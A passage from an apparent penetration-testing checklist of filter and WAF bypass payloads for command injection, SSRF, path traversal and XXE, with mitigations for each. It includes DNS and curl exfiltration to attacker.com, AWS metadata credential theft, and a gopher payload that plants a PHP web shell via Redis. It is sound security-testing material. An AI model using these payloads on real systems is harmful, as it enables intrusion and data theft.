**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
| ls | || ls || & ls & && ls && %0a ls %0a `ls` $(ls)
```

**Why It Works:** Multiple characters separate commands in shells; filter blocking one separator may miss others

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Block all command separators; use allowlist for permitted commands; avoid shell execution

**Tools:** Burp Suite, commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); OWASP OS Command Injection, PayloadsAllTheThings

---

## FILTER-047 — Variable and Wildcard Expansion
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** param reaching OS command — behind Server-Side Blacklist Filter

**How It Works:** Use shell variable expansion and wildcards to construct blocked command names

**Detection Method:** Try $() variable expansion and ? * wildcards

**Test Steps:** 1. Confirm 'cat' is blocked 2. Try c$()at /etc/passwd 3. Try /bin/c?t /etc/passwd 4. Try cat$IFS/etc/passwd

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
c$()at /etc/passwd | /bin/c?t /etc/pa??wd | c\at /etc/passwd | $'\x63\x61\x74' /etc/passwd | {cat,/etc/passwd}
```

**Why It Works:** Shell expands variables/wildcards/escapes before execution; filter sees unexpanded form not 'cat'

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Use allowlist of commands; avoid user input in shell commands entirely

**Tools:** Burp Suite, commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PayloadsAllTheThings Command Injection

---

## FILTER-048 — IFS (Internal Field Separator) Bypass
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** param reaching OS command — behind Server-Side Blacklist Filter

**How It Works:** Space character is filtered; use $IFS or {command,arg} or tabs as alternatives

**Detection Method:** Try $IFS when spaces are blocked

**Test Steps:** 1. Send cat /etc/passwd (blocked due to space) 2. Try cat$IFS/etc/passwd 3. Try cat${IFS}/etc/passwd 4. Try {cat,/etc/passwd} 5. Try cat%09/etc/passwd (tab)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
cat$IFS/etc/passwd | cat${IFS}/etc/passwd | {cat,/etc/passwd} | cat<>/etc/passwd | X=$'cat\x20/etc/passwd'&&$X
```

**Why It Works:** $IFS defaults to space/tab/newline in bash; shell brace expansion {cmd,arg} adds space; tab (%09) often not filtered

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Don't filter characters; avoid shell execution with user input; use language-specific APIs instead of shell

**Tools:** Burp Suite, commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PayloadsAllTheThings, OWASP

---

## FILTER-049 — Base64 Encoded Command
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** param reaching OS command — behind Server-Side Blacklist Filter

**How It Works:** Encode entire command in base64 and use bash to decode and execute

**Detection Method:** Try base64-encoded commands when keywords blocked

**Test Steps:** 1. Base64 encode command: echo 'id' | base64 → aWQ= 2. Inject: echo aWQ= | base64 -d | bash 3. Test with curl/wget payloads

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
echo$IFS'aWQ='|base64$IFS-d|bash | bash<<<$(base64$IFS-d<<<aWQ=) | python3 -c "import os;os.system('id')"
```

**Why It Works:** Entire command is encoded so no command keywords visible to filter; decoded at runtime by bash

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Block base64 decode pipes; restrict available system commands; containerize applications

**Tools:** Burp Suite, CyberChef

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PayloadsAllTheThings, HackerOne reports

---

## FILTER-050 — Slash and Path Bypass
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** param reaching OS command — behind Server-Side Blacklist Filter

**How It Works:** Forward slash / is filtered preventing path specification

**Detection Method:** Try alternative path representations

**Test Steps:** 1. / is blocked 2. Try ${PATH:0:1} (extracts / from PATH var) 3. Try ${HOME:0:1} 4. Try echo . | tr '!-0' '-1' (generates /)"

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
cat ${PATH:0:1}etc${PATH:0:1}passwd | cat $(echo . | tr '!-0' "\-1"")etc$(echo . | tr '!-0' ""\"-1"")passwd"
```

**Why It Works:** Shell variable slicing ${PATH:0:1} extracts first character of PATH which is /; avoids literal slash in payload

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Use allowlist; avoid shell; restrict filesystem access

**Tools:** Burp Suite

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PayloadsAllTheThings, bash manual

---

## FILTER-051 — DNS Exfiltration via Command Injection
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** param reaching OS command — behind WAF (Generic)

**How It Works:** When command output not visible; exfiltrate via DNS

**Detection Method:** Set up DNS listener and inject DNS lookup command

**Test Steps:** 1. Start Burp Collaborator/interactsh 2. Inject: nslookup $(whoami).attacker.com 3. Check DNS listener for subdomain with command output

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
$(nslookup $(whoami).attacker.com) | `curl http://$(hostname).attacker.com` | ping -c 1 $(id|base64).attacker.com
```

**Why It Works:** DNS queries bypass most firewalls; command output embedded in DNS query label is received by attacker's DNS server

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Block outbound DNS from application server; use internal DNS only; network segmentation

**Tools:** Burp Collaborator, interactsh, dnsbin

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); OWASP, Bug bounty techniques

---

## FILTER-052 — Polyglot Payload
**Test Category:** Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** param reaching OS command — behind WAF (Generic)

**How It Works:** Craft payload that works as valid input for multiple interpreters/contexts

**Detection Method:** Create context-independent command injection payload

**Test Steps:** 1. Craft payload valid in multiple contexts 2. Test in URL parameter query body etc. 3. Verify execution

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — OS command executes on the server (full compromise)

**Payload Example:**

```
`sleep 5` | ;sleep 5; | &&sleep 5&& | $(sleep 5) | %0asleep 5%0a
```

**Why It Works:** Polyglot works regardless of how input is inserted into shell command; covers multiple quoting contexts

**Impact:** Filter/WAF bypass enabling Command Injection — OS command executes on the server (full compromise)

**Mitigation:** Avoid shell commands; use language-native APIs for OS interaction

**Tools:** Burp Suite, commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PayloadsAllTheThings

---

## FILTER-053 — Alternative IP Representations
**Test Category:** SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** URL/host parameter — behind Server-Side Blacklist Filter

**How It Works:** Filter blocks 127.0.0.1 and localhost; use alternative representations

**Detection Method:** Try decimal/hex/octal IP formats

**Test Steps:** 1. 127.0.0.1 blocked 2. Try 2130706433 (decimal) 3. Try 0x7f000001 (hex) 4. Try 0177.0.0.1 (octal) 5. Try 127.1 (short) 6. Try [::1] (IPv6)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
http://2130706433/ | http://0x7f000001/ | http://0177.0.0.1/ | http://127.1/ | http://[::1]/ | http://0/ | http://127.0.0.1.nip.io/
```

**Why It Works:** All representations resolve to 127.0.0.1; IP parsers handle multiple formats; blacklist only checks standard dotted notation

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Validate resolved IP address after DNS resolution not just input string; use allowlist of permitted hosts

**Tools:** Burp Suite, curl

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); PortSwigger SSRF labs, OWASP SSRF Prevention

---

## FILTER-054 — DNS Rebinding
**Test Category:** SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** URL/host parameter — behind Server-Side Blacklist Filter

**How It Works:** First DNS lookup resolves to allowed IP; second resolution (during connection) resolves to internal IP

**Detection Method:** Set up DNS rebinding service

**Test Steps:** 1. Register domain with DNS rebinding service 2. Configure: first response=allowed-IP second response=127.0.0.1 3. Submit URL with rebinding domain 4. App validates first resolution connects on second

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
url=http://rebinding-domain.attacker.com/admin (first resolves to 1.2.3.4 then to 127.0.0.1)
```

**Why It Works:** Application validates domain/IP on first resolution but the actual HTTP request uses second resolution which points to internal host

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Pin DNS resolution; validate IP at connection time not just lookup time; use TOCTOU-safe resolution

**Tools:** rbndr.us, rebind.it, Singularity, Burp Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); PortSwigger SSRF, DNS rebinding research by Taviso

---

## FILTER-055 — URL Redirect-Based SSRF
**Test Category:** SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** URL/host parameter — behind Server-Side Blacklist Filter

**How It Works:** URL passes validation but redirects to internal target

**Detection Method:** Find open redirect on allowed domain or use URL shortener

**Test Steps:** 1. Find open redirect on whitelisted domain 2. Craft: http://allowed-domain.com/redirect?url=http://169.254.169.254/ 3. Submit crafted URL

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
url=http://allowed.com/redir?to=http://169.254.169.254/latest/meta-data/ | url=http://bit.ly/abc (shortlink to internal IP)
```

**Why It Works:** Application validates initial URL against allowlist; follows redirect to internal resource without revalidating

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Disable HTTP redirects in SSRF-prone requests; revalidate each redirect destination

**Tools:** Burp Suite, curl -L

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); PortSwigger SSRF via redirect, OWASP

---

## FILTER-056 — URL Schema Bypass
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** URL/host parameter — behind Server-Side Blacklist Filter

**How It Works:** http:// blocked but other schemas work: file:// gopher:// dict://

**Detection Method:** Try alternative URL schemes

**Test Steps:** 1. http://internal blocked 2. Try file:///etc/passwd 3. Try gopher://internal:port/payload 4. Try dict://internal:port/info

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
file:///etc/passwd | gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a | dict://127.0.0.1:6379/info
```

**Why It Works:** Filter only blocks http/https schemes; file:// reads local files; gopher:// sends arbitrary TCP data; dict:// probes services

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Allowlist permitted URL schemes (http/https only); block all others explicitly

**Tools:** Burp Suite, Gopherus

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); PayloadsAllTheThings SSRF, Orange Tsai research

---

## FILTER-057 — URL Parser Confusion
**Test Category:** SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** URL/host parameter — behind Server-Side Blacklist Filter

**How It Works:** Different URL parsers interpret same URL differently; parser used for validation vs connection differ

**Detection Method:** Test URLs with ambiguous components (@  # \\ etc.)

**Test Steps:** 1. Try http://allowed.com@internal-host/ 2. Try http://internal-host#@allowed.com 3. Try http://allowed.com\\@internal-host

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
http://expected-host@evil-host/ | http://evil-host%23@expected-host/ | http://expected-host\\@evil-host/
```

**Why It Works:** URL parsers disagree on which part is hostname; validation parser sees expected-host; connection library connects to evil-host

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Use single URL parser for both validation and connection; use allowlist-based approach

**Tools:** Burp Suite

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai SSRF research, PortSwigger

---

## FILTER-058 — AWS IMDSv1 Metadata Access
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Cloud Metadata Protection

**Where to Test / Injection Point:** URL/host parameter — behind Cloud Metadata Protection

**How It Works:** Access AWS metadata endpoint to steal IAM credentials

**Detection Method:** Test if 169.254.169.254 is accessible from application

**Test Steps:** 1. Submit url=http://169.254.169.254/latest/meta-data/ 2. Try url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ 3. Extract IAM role credentials

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Cloud Metadata Protection and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME | http://[fd00:ec2::254]/latest/meta-data/
```

**Why It Works:** AWS metadata endpoint provides temporary IAM credentials; no authentication required for IMDSv1

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Enforce IMDSv2 (requires token); block 169.254.169.254 in egress firewall; use VPC endpoints

**Tools:** Burp Suite, curl

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); AWS security documentation, PortSwigger SSRF to RCE

---

## FILTER-059 — SSRF via Gopher Protocol
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Firewall

**Where to Test / Injection Point:** URL/host parameter — behind WAF/Firewall

**How It Works:** Use gopher:// to send arbitrary data to internal services (Redis/SMTP/MySQL)

**Detection Method:** Test if gopher:// scheme is accepted by application

**Test Steps:** 1. Verify SSRF exists 2. Generate gopher payload for target service (Redis: flush + set webshell) 3. URL encode payload 4. Submit

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Firewall and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$22%0d%0a<?php system($_GET[c]);?>%0d%0a
```

**Why It Works:** Gopher protocol sends raw TCP data; can speak any text-based protocol (Redis/SMTP/MySQL/FastCGI)

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Block gopher:// scheme; network segment internal services; require authentication

**Tools:** Gopherus tool, Burp Suite

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai research, PayloadsAllTheThings SSRF

---

## FILTER-060 — Subdomain/Domain Confusion
**Test Category:** SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Allowlist Bypass

**Where to Test / Injection Point:** URL/host parameter — behind Allowlist Bypass

**How It Works:** Allowlist checks if domain ends with .allowed.com but attacker uses evil-allowed.com

**Detection Method:** Register domain that contains allowed domain as substring

**Test Steps:** 1. Identify allowed domain pattern 2. Register attacker-allowed.com or allowed.com.attacker.com 3. Submit URL with attacker domain

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Allowlist Bypass and reaches the sink — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Payload Example:**

```
http://internal.allowed.com.attacker.com/ | http://attacker-allowed.com/ | http://allowed.com.attacker.com/
```

**Why It Works:** Regex check for 'allowed.com' in domain matches substring; doesn't verify exact domain boundary

**Impact:** Filter/WAF bypass enabling SSRF — server makes attacker-controlled request (internal access, cloud-metadata theft)

**Mitigation:** Use proper domain parsing; check exact domain match with parsed hostname; anchor regex properly

**Tools:** Burp Suite

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); OWASP SSRF, bug bounty writeups

---

## FILTER-061 — Double Encoding Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** file-path parameter — behind Server-Side Blacklist Filter

**How It Works:** ../ is filtered but double-encoded version passes filter and gets decoded by web server

**Detection Method:** Try double-encoded traversal sequences

**Test Steps:** 1. Send ../../../etc/passwd (blocked) 2. Try ..%252f..%252f..%252fetc/passwd (double encode) 3. Try %2e%2e%2f%2e%2e%2f

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
..%252f..%252f..%252fetc%252fpasswd | %252e%252e%252f%252e%252e%252f | ..%c0%af..%c0%af
```

**Why It Works:** Filter decodes once and checks; web server/application decodes second time revealing traversal sequence

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Canonicalize path before validation; use realpath() to resolve; chroot/jail file access

**Tools:** Burp Suite, dotdotpwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger Path Traversal, OWASP WSTG-ATHZ-01

---

## FILTER-062 — Null Byte Truncation
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** file-path parameter — behind Server-Side Blacklist Filter

**How It Works:** Application appends file extension; null byte truncates path before extension is added

**Detection Method:** Try %00 before forced extension

**Test Steps:** 1. App requests file.php?page=home (adds .php → home.php) 2. Try page=../../../etc/passwd%00 3. Null byte terminates string before .php appended

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
page=../../../etc/passwd%00 | page=../../../etc/passwd%00.php | page=....//....//etc/passwd%00
```

**Why It Works:** C-based string functions treat null byte as string terminator; path becomes /etc/passwd ignoring appended extension (works in PHP &lt; 5.3.4)

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Update PHP/language runtime; validate file exists with extension; use allowlist of permitted files

**Tools:** Burp Suite, dotdotpwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); OWASP Path Traversal, CVE-2006-7243

---

## FILTER-063 — Unicode/UTF-8 Overlong Encoding
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** file-path parameter — behind Server-Side Blacklist Filter

**How It Works:** Use overlong UTF-8 or Unicode encoding for dot and slash characters

**Detection Method:** Try Unicode representations of . and /

**Test Steps:** 1. ../ blocked 2. Try %c0%ae%c0%ae%c0%af (overlong ../) 3. Try ..%c0%af (overlong /) 4. Try %uff0e%uff0e/ (fullwidth dots)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
..%c0%af..%c0%af | %c0%ae%c0%ae%c0%af | ..%ef%bc%8f..%ef%bc%8f (fullwidth slash)
```

**Why It Works:** Some web servers (older IIS/Tomcat) decode overlong UTF-8 to standard chars after security check

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Update web server; reject overlong UTF-8; normalize before validation

**Tools:** Burp Suite, dotdotpwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); CVE-2008-2938 (Tomcat), CVE-2000-0884 (IIS)

---

## FILTER-064 — Nested Traversal Bypass
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** file-path parameter — behind Server-Side Blacklist Filter

**How It Works:** Filter strips ../ once; nested ....// survives after single strip

**Detection Method:** Try doubled/nested traversal sequences

**Test Steps:** 1. ../ is stripped to empty 2. Try ....// (strip ../ from middle leaves ../) 3. Try ....\/  4. Try ..../

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
....//....//....//etc/passwd | ....\\\\....\\\\etc\\\\passwd | ..../....//etc/passwd
```

**Why It Works:** Filter removes '../' from '..../' leaving '../' which is valid traversal; single-pass filter defeated

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Use recursive stripping or canonical path validation; realpath() comparison

**Tools:** Burp Suite, dotdotpwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger Path Traversal labs, WAHH

---

## FILTER-065 — Path Traversal via Absolute Path
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** file-path parameter — behind WAF (Generic)

**How It Works:** Instead of traversal use absolute path directly

**Detection Method:** Try absolute path without ../../

**Test Steps:** 1. ../../etc/passwd blocked 2. Try /etc/passwd directly 3. Try /var/www/html/config.php

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
filename=/etc/passwd | path=/proc/self/environ | file=/var/log/apache2/access.log
```

**Why It Works:** Some apps prepend directory but accept absolute paths starting with /; bypasses ../ filter entirely

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Validate file is within expected directory using canonical path comparison; chroot

**Tools:** Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); OWASP Path Traversal, PortSwigger

---

## FILTER-066 — Windows-Specific Path Bypass
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** file-path parameter — behind Server-Side Filter

**How It Works:** Use Windows-specific path features: backslash; ADS; short names; UNC

**Detection Method:** Try Windows path alternatives on Windows targets

**Test Steps:** 1. Try ..\\..\\..\\windows\\win.ini 2. Try ....\\ 3. Try filename::$DATA (ADS) 4. Try \\\\attacker\\share\\malicious

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — arbitrary file read/write outside the intended directory

**Payload Example:**

```
..\\..\\..\\windows\\win.ini | file.php::$DATA | ....\\....\\windows\\system32\\config\\SAM | //?/C:/Windows/win.ini
```

**Why It Works:** Windows accepts both / and \\ as separators; ADS (::$DATA) accesses raw file stream; short names bypass filename filters

**Impact:** Filter/WAF bypass enabling Path Traversal — arbitrary file read/write outside the intended directory

**Mitigation:** Normalize path separators; block ADS syntax; validate canonical path

**Tools:** Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); OWASP Windows Path Traversal, PayloadsAllTheThings

---

## FILTER-067 — XXE via Content-Type Change
**Test Category:** XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** XML request body — behind Server-Side Filter

**How It Works:** Application accepts JSON but also parses XML if Content-Type changed

**Detection Method:** Change Content-Type to application/xml and send XML body

**Test Steps:** 1. Normal request sends JSON 2. Change Content-Type to application/xml 3. Send XML with XXE payload in body 4. Check for file content in response

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Payload Example:**

```
Content-Type: application/xml\r\n\r\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

**Why It Works:** Many frameworks auto-detect content type; XML parser processes XXE if XML body received regardless of expected format

**Impact:** Filter/WAF bypass enabling XXE — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Mitigation:** Disable external entity processing in XML parser; restrict accepted Content-Types

**Tools:** Burp Suite

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE labs, OWASP XXE Prevention

---

## FILTER-068 — XXE via SVG Upload
**Test Category:** XXE · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** XML request body — behind Server-Side Filter

**How It Works:** Upload SVG file containing XXE payload when XML/XXE keywords blocked in text input

**Detection Method:** Upload SVG file to image upload endpoint

**Test Steps:** 1. Create SVG file with XXE in DOCTYPE 2. Upload to image/avatar upload 3. Request uploaded SVG 4. Check for entity resolution in response

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Payload Example:**

```
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

**Why It Works:** SVG is XML-based; server-side SVG processing (resizing/converting) parses XML and resolves entities

**Impact:** Filter/WAF bypass enabling XXE — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Mitigation:** Process SVG with safe parser; disable DTD processing; convert SVG to raster before storing

**Tools:** Burp Suite, custom SVG file

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE via file upload, OWASP

---

## FILTER-069 — XXE via XLSX/DOCX Upload
**Test Category:** XXE · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** XML request body — behind Server-Side Filter

**How It Works:** Office Open XML files are ZIP archives containing XML; embed XXE in internal XML

**Detection Method:** Create malicious XLSX/DOCX with XXE in internal XML file

**Test Steps:** 1. Create normal XLSX 2. Unzip it 3. Inject XXE into xl/workbook.xml or [Content_Types].xml 4. Rezip 5. Upload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Payload Example:**

```
Inside xl/workbook.xml: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> then reference &xxe; in XML content
```

**Why It Works:** XLSX/DOCX/PPTX are ZIP archives containing XML; server-side parsing of these files may process XXE in internal XML

**Impact:** Filter/WAF bypass enabling XXE — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Mitigation:** Use safe XML parser for Office file processing; disable external entities in document parsers

